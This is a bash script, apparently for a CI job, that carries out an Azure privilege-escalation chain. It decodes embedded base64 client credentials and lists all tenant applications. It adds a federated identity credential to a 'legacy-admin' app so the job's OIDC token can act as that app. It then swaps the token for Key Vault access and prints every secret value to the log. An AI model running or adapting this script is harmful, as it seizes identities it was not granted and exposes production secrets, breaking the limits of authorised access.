#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

# Get Graph token via sync-service
GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" \
  -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "GT_LEN=${#GT}"

# Step 1: Find ALL applications and their objectIds
echo "=== ALL APPS ==="
APPS=$(curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=id,appId,displayName" \
  -H "Authorization: Bearer $GT")
echo "$APPS" | jq -r '.value[] | "\(.displayName) appId=\(.appId) objId=\(.id)"'

# Step 2: Find tbl-legacy-admin application objectId
LEGACY_OBJ=$(echo "$APPS" | jq -r '.value[] | select(.appId=="891fb158-e02c-4428-a885-53b811f369c0") | .id')
echo "LEGACY_APP_OBJ=$LEGACY_OBJ"

# Also check what 22a3fb7e is
WRONG_APP=$(echo "$APPS" | jq -r '.value[] | select(.id=="22a3fb7e-860a-4708-9e50-3d36aa21191c") | .displayName')
echo "WRONG_OBJ_APP=$WRONG_APP"

# Step 3: List existing federated creds on legacy-admin
echo "=== LEGACY FEDERATED CREDS ==="
FCS=$(curl -sS "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT")
echo "$FCS" | jq '.value[]? | {name,subject,issuer}'
FC_COUNT=$(echo "$FCS" | jq '.value | length')
echo "FC_COUNT=$FC_COUNT"

# Step 4: Get OIDC token to check subject
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
OIDC_PAYLOAD=$(echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null || true)
OIDC_SUB=$(echo "$OIDC_PAYLOAD" | jq -r .sub)
OIDC_ISS=$(echo "$OIDC_PAYLOAD" | jq -r .iss)
echo "OIDC_SUB=$OIDC_SUB"
echo "OIDC_ISS=$OIDC_ISS"

# Step 5: Add federated cred to the CORRECT legacy-admin app with CORRECT subject
if [ -n "$LEGACY_OBJ" ]; then
  echo "=== ADD FIC TO LEGACY ==="
  FIC=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{
      \"name\": \"ghpipe\",
      \"issuer\": \"$OIDC_ISS\",
      \"subject\": \"$OIDC_SUB\",
      \"audiences\": [\"api://AzureADTokenExchange\"],
      \"description\": \"pipe\"
    }")
  echo "FIC_RESULT=$(echo "$FIC" | jq -r '.id // .error.code')"
  echo "FIC_FULL=$(echo "$FIC" | jq -c '.')"
  
  # If already exists, try different name
  FIC_ERR=$(echo "$FIC" | jq -r '.error.code // empty')
  if [ "$FIC_ERR" = "Request_MultipleObjectsWithSameKeyValue" ]; then
    echo "Already exists, trying exchange directly..."
  fi
  
  # Step 6: Exchange OIDC for legacy-admin token (vault scope)
  sleep 3
  echo "=== LEGACY EXCHANGE (vault) ==="
  LA_VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "scope=https://vault.azure.net/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC")
  LA_VT=$(echo "$LA_VT_RAW" | jq -r '.access_token // empty')
  LA_VT_ERR=$(echo "$LA_VT_RAW" | jq -r '.error_description // empty')
  
  if [ -n "$LA_VT" ]; then
    echo "LA_VT_LEN=${#LA_VT}"
    
    # KV2 secrets
    echo "=== KV2 SECRETS ==="
    KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
      -H "Authorization: Bearer $LA_VT")
    echo "KV2=$(echo "$KV2" | jq -c '.')"
    
    for SID in $(echo "$KV2" | jq -r '.value[]?.id // empty'); do
      SNAME=$(basename "$SID")
      SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $LA_VT")
      echo "SECRET_${SNAME}=$(echo "$SVAL" | jq -r '.value // .error.code')"
    done
    
    # KV1 too
    echo "=== KV1 SECRETS ==="
    KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
      -H "Authorization: Bearer $LA_VT")
    echo "KV1=$(echo "$KV1" | jq -c '.')"
  else
    echo "EXCHANGE_FAILED: $LA_VT_ERR"
    
    # Try management scope
    echo "=== LEGACY EXCHANGE (mgmt) ==="
    LA_MT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
      -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
      -d "scope=https://management.azure.com/.default" \
      -d "grant_type=client_credentials" \
      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
      -d "client_assertion=$OIDC")
    echo "MGMT_ERR=$(echo "$LA_MT_RAW" | jq -r '.error_description // .access_token | length')"
  fi
fi

echo "=== DONE ==="